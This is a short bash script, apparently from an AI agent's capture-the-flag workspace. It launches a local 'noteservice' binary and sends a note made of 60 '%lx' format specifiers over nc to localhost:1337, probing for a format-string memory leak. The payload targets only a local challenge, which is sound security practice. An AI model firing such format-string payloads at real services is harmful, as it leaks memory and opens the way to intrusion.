#!/bin/bash
cd /workspace/bc473ce1-0084-4ee1-9a9c-b5f7880a9ccc/worktrees/worktree_47149abf-92dc-4dd8-b8f8-ff00d4730ac0/challenge
./noteservice &
SERVER_PID=$!
sleep 1
# Generate 60 %lx format specifiers
FMT=$(python3 -c "print('%lx.' * 60)")
echo -e "register t\ncreate 300\nwrite 0 $FMT\nquit" | nc -w 3 localhost 1337
kill $SERVER_PID 2>/dev/null
wait $SERVER_PID 2>/dev/null